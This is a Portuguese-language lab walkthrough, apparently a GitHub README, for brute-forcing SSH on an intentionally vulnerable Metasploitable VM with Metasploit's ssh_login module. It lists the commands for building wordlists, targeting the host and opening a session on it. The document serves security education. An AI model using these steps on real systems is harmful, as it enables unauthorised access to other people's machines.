# Ataque SSH 

## Objetivo
Realizar um ataque de força bruta ao protocolo SSH de uma máquina vulnerável utilizando o Metasploit, com o objetivo de obter acesso remoto.

## Cenário
- **VM atacada**: Metasploitable (com serviço SSH habilitado e credenciais conhecidas)
- **VM atacante**: Kali Linux
- **Virtualizador**: VirtualBox

## Procedimento

### Criação dos arquivos de força bruta
1. **Crie um arquivo com possíveis senhas:**
   ```bash
   echo -e "teste" > password.txt
   ```
2. **Edite o arquivo para adicionar mais senhas, incluindo a senha da VM (msfadmin):**
   ```bash
   nano password.txt
   ```
3. **Verifique o conteúdo do arquivo criado:**
   ```bash
   cat password.txt
   ```
   
  ![image](https://github.com/user-attachments/assets/4fdf431b-f391-4615-a91f-341c79a80c29)

4. **Repita o mesmo processo para criar um arquivo com nomes de usuários:**
   ```bash
   echo -e "teste" > user.txt
   nano user.txt
   cat user.txt
   ```
![image](https://github.com/user-attachments/assets/f45c2f1e-c2d7-4e01-9f2a-66edf60056c7)


**Nota**: Incluir o usuário "msfadmin" no arquivo tanto de senha quanto de usuário.

### Configurando o ataque no Kali Linux

1. **Obtenha acesso root:**
   ```bash
   sudo su
   ```
2. **Inicie o Metasploit:**
   ```bash
   msfconsole
   ```
3. **Pesquise o módulo para força bruta no SSH:**
   ```bash
   search ssh_login
   ```
4. **Carregue o módulo auxiliar para ataques de força bruta:**
   ```bash
   use auxiliary/scanner/ssh/ssh_login
   ```
5. **Confira as opções necessárias:**
   ```bash
   info
   ```

### Configuração do ataque
1. **Defina o endereço IP da máquina atacada:**
   ```bash
   set rhosts 192.168.56.101
   ```
2. **Informe o arquivo com os usuários:**
   ```bash
   set USER_FILE /home/usuario/user.txt
   ```
3. **Informe o arquivo com as senhas:**
   ```bash
   set PASS_FILE /home/usuario/password.txt
   ```
4. **Execute o ataque:**
   ```bash
   exploit
   ```

### Exploração da máquina
1. **Verifique as sessões criadas:**
   ```bash
   sessions
   ```
2. **Conecte-se à sessão:**
   ```bash
   sessions 1
   ```
3. **Explore a máquina atacada, navegando pelos arquivos e sistemas:**

![image](https://github.com/user-attachments/assets/a5de6055-044d-4f5e-b1b3-48a96016b7c4)

***Este ataque é realizado em ambiente controlado para fins educacionais***



